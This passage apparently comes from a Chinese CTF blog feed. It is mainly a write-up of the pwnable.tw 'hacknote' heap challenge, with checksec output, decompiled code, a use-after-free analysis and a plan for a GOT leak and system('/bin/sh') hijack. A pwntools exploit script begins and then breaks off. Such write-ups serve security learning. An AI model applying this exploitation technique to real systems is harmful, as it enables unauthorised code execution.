punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x29</span> bytes<span class="token operator">:</span>    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'supermarket\n'</span>bindevflagliblib32lib64supermarket$  </code></pre><p><img src="https://s1.ax1x.com/2020/09/14/ws9vVg.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个题困了我挺久了，究其原因就是没有认真分析add函数及其数据结构，直接从网上瞎搜索没啥用（除非运气好），还不如自己测试。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-notehack</title>
      <link href="/2020/09/13/xctf-challenge-notehack/"/>
      <url>/2020/09/13/xctf-challenge-notehack/</url>
      
        <content type="html"><![CDATA[<h2 id="别的不说，看我一手E技能点Q点点，破败接点点，芜湖-起飞-。"><a href="#别的不说，看我一手E技能点Q点点，破败接点点，芜湖-起飞-。" class="headerlink" title="别的不说，看我一手E技能点Q点点，破败接点点，芜湖 起飞~~。"></a>别的不说，看我一手E技能点Q点点，破败接点点，芜湖 起飞~~。</h2><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>pwnable<span class="token punctuation">.</span>tw hacknote$ checksec hacknote<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/how2heap/my_heap/pwnable.tw hacknote/hacknote'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>只要没开启PIE就好说<span class="token operator">~</span>hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>pwnable<span class="token punctuation">.</span>tw hacknote$ <span class="token punctuation">.</span>/hacknote <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>       HackNote       <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token number">1</span><span class="token punctuation">.</span> Add note           <span class="token number">2</span><span class="token punctuation">.</span> Delete note        <span class="token number">3</span><span class="token punctuation">.</span> Print note         <span class="token number">4</span><span class="token punctuation">.</span> Exit              <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Your choice <span class="token operator">:</span></code></pre><p>经典堆题</p><h2 id="IDA–关键函数"><a href="#IDA–关键函数" class="headerlink" title="IDA–关键函数"></a>IDA–关键函数</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>chunk_current<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_cont <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self_puts<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        chunk_current <span class="token operator">=</span> note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        chunk_current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>note_cont<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h3><p>个人觉得经典堆题最重要的是要分析清楚其信息存放的数据结构，也就是着重分析add函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>chunk_current<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_cont <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//note_cont全局变量，note的个数最多为5</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//note_ptr是全局指针数组，存放chunk的指针</span>      <span class="token punctuation">{</span>        note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//8个字节是32位下最小的chunk</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//其实只要我们不会用到这些报错函数，完全可忽略</span>        <span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self_puts<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解引用 指向chunk的指针，并放入信息</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        chunk_current <span class="token operator">=</span> note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk_current 存放当前操作的chunk的地址 即chunk_user_data_addr</span>        chunk_current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk_current[1]即chunk_user_data第二个字长 。</span>                                        <span class="token comment" spellcheck="true">//再次malloc size的空间其chunk_user_data_addr放入chunk_current[1]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>                                     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//====>read(0, *((void **)note_ptr[i] + 1), size); 这里用ida简化了</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//将chunk地址转化为void**(二级指针) 类型指针 然后+1 再整体解引用 也就是获取了chunk_user_data第二个字长里面的信息</span>        <span class="token operator">++</span>note_cont<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">//即malloc(size)的地址</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最好还是画出数据结构图：<br><img src="https://s1.ax1x.com/2020/09/13/w0Ck28.png" alt=""><br>再看看add的好兄弟，del函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//删除的目标是否空闲</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//free掉content_chunk</span>    <span class="token function">free</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//free掉第信息 chunk</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将add函数中申请的两个chunk都释放，但是没有将指针置零，即指针还在指针数组note_ptr[i]中，这就出现了UFA漏洞。</p><p>纵身一跃来到show函数和他的好基友self_puts函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//在add函数中第一个chunk的第一个字段就存放了self_puts函数的地址，</span>                                    <span class="token comment" spellcheck="true">//结合self_puts函数分析可知这里是利用函数指针进行函数调用</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//注意这个+4之后再整体解引用</span><span class="token punctuation">}</span></code></pre><p>如果正常执行这里将会输出第一个chunk的第二字段所指向的conten_chunk.</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li><p>存在USF漏洞</p></li><li><p>刚好在show函数会将第一个chunk里的第一字段视为函数指针进行解引用（高权限指针）</p></li><li><p>先进行两次add 得到两个note 每一个note里面包含两个chunk第一个chunk大小为0x10 ，第二个chunk大小为0x18</p></li><li><p>del前两个note，再add一个note其chunk_1 大小为0x10，chunk_2大小为0x10，这样低权限指针就会和高权限指针指向同一个chunk<br><img src="https://s1.ax1x.com/2020/09/13/w0CAxS.png" alt=""></p></li><li><p>没有system bin/sh 后门 所以要泄露地址===&gt;利用note3往其第二个chunk中写入p32（self_puts）和p32（@got）然后执行show（0）即可泄露got表里面的内容</p></li><li><p>得到libc版本，和libc地址后获取system  bin/sh地址</p></li><li><p>del（2）再次add（3）这次将p32（system）和p32(/bin/sh)填入，再show（0）</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token 